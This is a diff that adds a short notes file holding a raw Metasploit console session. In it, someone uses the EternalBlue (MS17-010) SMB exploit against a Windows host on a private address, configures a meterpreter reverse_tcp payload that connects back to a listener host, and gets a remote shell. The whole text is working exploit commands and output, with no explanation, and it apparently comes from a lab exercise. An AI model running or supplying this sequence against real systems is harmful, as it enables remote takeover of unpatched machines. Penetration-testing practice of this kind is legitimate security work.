@@ -1,0 +1,31 @@
+# ---
+# eternalblue
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > search eternalblue
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 172.16.11.100
+RHOSTS => 172.16.11.100
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 172.16.11.200
+LHOST => 172.16.11.200
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 44444
+LPORT => 44444
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+
+[+] 172.16.11.100:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 172.16.11.100:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 172.16.11.100:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter > pwd
+C:\Windows\system32
